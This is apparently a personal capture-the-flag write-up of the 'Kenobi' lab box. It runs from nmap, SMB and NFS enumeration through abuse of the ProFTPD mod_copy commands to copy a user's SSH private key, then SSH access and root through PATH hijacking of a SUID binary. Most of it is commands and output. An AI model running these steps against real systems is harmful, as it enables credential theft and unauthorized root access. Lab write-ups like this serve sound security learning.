## Nmap
```
┌[parrot]─[12:41-02/07]─[/home/glack]
└╼glack$nmap -sV -sT -A 10.10.110.24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 12:41 IST
Nmap scan report for 10.10.110.24
Host is up (0.49s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42857/tcp   mountd
|   100005  1,2,3      47111/udp6  mountd
|   100005  1,2,3      55942/udp   mountd
|   100005  1,2,3      56171/tcp6  mountd
|   100021  1,3,4      35127/tcp6  nlockmgr
|   100021  1,3,4      38255/tcp   nlockmgr
|   100021  1,3,4      44297/udp   nlockmgr
|   100021  1,3,4      46873/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m27s, deviation: 2h53m13s, median: -32s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-07-02T02:11:25-05:00
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-07-02T07:11:25
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.09 seconds
```


## SMB

```
┌[parrot]─[12:48-02/07]─[/home/glack]
└╼glack$smbclient -L \\\\10.10.110.24\\anonymous
```


```
[parrot]─[12:48-02/07]─[/home/glack]
└╼glack$smbclient  \\\\10.10.110.24\\anonymous -U anonymous
```

```
smb: \> get log.txt

```


We get to know that id_rsa file is in /home/kenobi/.ssh/id_rsa 

## FTP

https://www.exploit-db.com/exploits/49908
Using this vulnerability

We understand that unauthenticated users can copy and paste files in target system

```
ftp> site  CPFR /home/kenobi/.ssh/id_rsa

```

```
ftp> site CPTO /var/tmp/id_rsa
```

We copy it into the var file because we understand it is available on ntf


## NFS


```
┌[parrot]─[13:44-02/07]─[/home/glack/Desktop/THM/kenobi]
└╼glack$sudo apt install nfs-common
```

Check for nfs mounts
```
┌[parrot]─[13:47-02/07]─[/home/glack/Desktop/THM/kenobi]
└╼glack$showmount -e 10.10.110.24
```


mount it into my machine 

```
┌[parrot]─[13:48-02/07]─[/home/glack/Desktop/THM/kenobi]
└╼glack$sudo mount -t nfs 10.10.110.24:/var /home/glack/Desktop/THM/kenobi/kenobinfs -nolock
```

```
-rw-r--r--  1 glack glack 1.7K Jul  2 13:50 id_rsa
```

```
[parrot]─[13:51-02/07]─[/home/glack/Desktop/THM/kenobi]
└╼glack$ssh kenobi@10.10.110.24 -i id_rsa
```

```
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

## Priv ESC

```
kenobi@kenobi:~$ find / -type f -perm -4000 -ls 2>/dev/null
```

```
/usr/bin/menu
```

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig

```


```
kenobi@kenobi:~$ strings /usr/bin/menu
```

In here we can see that that commands run are not ran with full path

```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig

```

Learned something new here - added to Linux privilege escalation tab

```

kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110
```

```
# cat root.txt
177b3cd8562289f37382721c28381f02
```